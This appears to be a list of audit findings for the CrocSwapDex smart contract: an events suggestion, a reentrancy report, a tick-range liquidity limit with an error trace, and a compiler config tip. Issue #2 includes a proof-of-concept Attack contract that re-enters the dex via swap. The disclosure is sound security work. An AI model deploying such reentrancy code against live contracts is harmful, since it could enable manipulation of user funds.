**Issue #1**
Add events when users claim rewards. This will allow users to more easily gather data about their balance changes off chain.

**Issue #2**
A user is able to re-enter ```CrocSwapDex.sol```. This is possible by calling ```userCMD()```, then calling ```swap()```.
Here is a basic example:
``` 
contract Attack {
    CrocSwapDex dex;
    address base;
    address quote;

    constructor(address _dex, address _base, address _quote) {
        dex = CrocSwapDex(_dex);
        base = _base;
        quote = _quote;
    }

    function callCMD(uint16 callpath, bytes calldata cmd) external {
        IERC20Minimal(base).approve(address(dex), type(uint256).max);
        IERC20Minimal(quote).approve(address(dex), type(uint256).max);
        dex.userCmd(callpath, cmd);
    }

    function recieve() external payable {
        dex.swap(
            base, // base
			quote, // quote
			36000, // poolIdx
			false, // isBuy
			false, // inBaseQty
			2000000, // qty
			0, // tip
			16602069666338596454400000, // limit price
			1900000000000000000, // min out
			0
        );
    }
}
```
I was not able to exploit anything further, but it is worth noting this is possible.

**Issue #3**
A user can not provide liquidity across the entirety of the ticks. In my tests the largest tick differential is [currTick - 940, currTick + 940].
This is the error I receive:
```
 Error: Transaction reverted without a reason string
    at CrocSwapDex.verifyCallResult (contracts/mixins/ProxyCaller.sol:64)
    at processTicksAndRejections (node:internal/process/task_queues:95:5)
    at runNextTicks (node:internal/process/task_queues:64:3)
    at listOnTimeout (node:internal/timers:538:9)
    at processTimers (node:internal/timers:512:7)
    at async HardhatNode._mineBlockWithPendingTxs (node_modules\hardhat\src\internal\hardhat-network\provider\node.ts:1866:23)
    at async HardhatNode.mineBlock (node_modules\hardhat\src\internal\hardhat-network\provider\node.ts:524:16)
    at async EthModule._sendTransactionAndReturnHash (node_modules\hardhat\src\internal\hardhat-network\provider\modules\eth.ts:1482:18)
```

**Issue #4**
When using ```via-ir``` with Hardhat it is recommended to adjust the hardhat config to included ```yulDetails```, like so:
```
optimizer: {
  enabled: true,
  runs: 25000,
  details: {
    yulDetails: {
      optimizerSteps: "u",
    },
  },
},
```
Since without ```via-ir``` the code in scope cannot compile due to a **stack too deep** error, it is best to follow this format.

